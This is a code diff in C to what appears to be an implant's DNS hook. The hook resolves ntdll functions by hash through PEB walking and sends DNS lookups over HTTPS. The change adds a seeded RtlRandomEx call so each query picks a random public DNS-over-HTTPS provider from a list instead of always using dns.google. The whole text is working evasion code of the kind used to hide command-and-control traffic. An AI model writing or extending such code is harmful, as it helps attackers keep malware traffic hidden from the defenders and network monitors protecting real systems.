@@ -28,6 +28,7 @@ typedef struct
 	D_API( LdrUnloadDll );
 	D_API( RtlFreeHeap );
 	D_API( LdrLoadDll );
+	D_API( RtlRandomEx );
 } API ;
 
 /* Hashes */
@@ -46,7 +47,9 @@ typedef struct
 #define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
 #define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
 #define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
+#define H_API_RTLRANDOMEX			0x7f1224f5 /* RtlRandomEx */
 #define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
+
 
 /*!
  *
@@ -75,6 +78,8 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 	HINTERNET	Icp = NULL;
 	HINTERNET	Hop = NULL;
 
+	ULONG 		seed = 1337;
+
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 
@@ -84,6 +89,7 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
 	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
 	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
+	Api.RtlRandomEx           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLRANDOMEX );
 
 	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"wininet.dll" ) ) );
 	Api.LdrLoadDll( NULL, 0, &Uni, &Win );
@@ -106,9 +112,19 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 
 		Iop = Api.InternetOpenA( NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
 
+		// https://github.com/curl/curl/wiki/DNS-over-HTTPS
+		ULONG_PTR domains[] = {
+			G_SYM( "dns.google" ),
+			G_SYM( "dns.quad9.net" ),
+			G_SYM( "mozilla.cloudflare-dns.com" ),
+			G_SYM( "cloudflare-dns.com" ),
+			G_SYM( "doh.opendns.com" ),
+			G_SYM( "ordns.he.net" )
+		};
+		
 		if ( Iop != NULL ) {
 			Icp = Api.InternetConnectA( Iop,
-					            C_PTR( G_SYM( "dns.google" ) ),
+					        C_PTR( domains[ Api.RtlRandomEx( &seed ) % ARRAYSIZE( domains ) ] ),
 						    INTERNET_DEFAULT_HTTPS_PORT,
 						    NULL,
 						    NULL,
